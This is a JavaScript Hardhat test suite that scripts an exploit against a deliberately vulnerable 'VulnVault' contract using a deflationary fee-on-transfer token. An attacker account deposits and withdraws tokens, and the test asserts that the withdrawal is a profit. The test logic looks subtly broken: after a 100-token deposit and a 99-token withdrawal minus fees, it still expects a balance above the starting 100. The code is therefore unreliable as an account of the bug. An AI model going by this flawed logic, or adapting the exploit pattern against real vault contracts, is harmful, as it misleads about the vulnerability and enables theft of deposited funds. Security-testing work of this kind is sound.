const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("VulnVault Exploitation Test Suite", function () {
  let VulnVault, vulnVault, MockToken, mockToken, owner, attacker;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    // Mock Token with Deflationary Fee-on-Transfer
    MockToken = await ethers.getContractFactory("STA"); 
    mockToken = await MockToken.deploy();
    await mockToken.deployed();

    // Deploy the VulnVault, setting the mockToken address
    VulnVault = await ethers.getContractFactory("VulnVault");
    vulnVault = await VulnVault.deploy(mockToken.address);
    await vulnVault.deployed();
  });

  it("Exploiting: should allow attacker to withdraw more tokens than deposited due to deflationary token", async function () {
    // Initial tokens transfer simulating attacker setup
    await mockToken.connect(owner).transfer(attacker.address, ethers.utils.parseUnits("100", 18));

    // Attacker approves VulnVault to spend tokens
    await mockToken.connect(attacker).approve(vulnVault.address, ethers.utils.parseUnits("100", 18));

    // Record initial attacker balance
    const initialBalance = await mockToken.balanceOf(attacker.address);

    // Attacker deposits 100 tokens (subject to fee)
    await vulnVault.connect(attacker).deposit(ethers.utils.parseUnits("100", 18));

    // Calculate expected withdrawal amount post-deposit fee
    const fee = ethers.utils.parseUnits("1", 18); // 1% Fee on transfer
    const expectedWithdrawAmount = ethers.utils.parseUnits("100", 18).sub(fee);

    // Withdraw attempt
    await expect(vulnVault.connect(attacker).withdraw(expectedWithdrawAmount)).to.not.be.reverted;

    // Assert final balance comparison to confirm malicious withdrawal success
    expect(await mockToken.balanceOf(attacker.address)).to.be.gt(initialBalance);
  });
});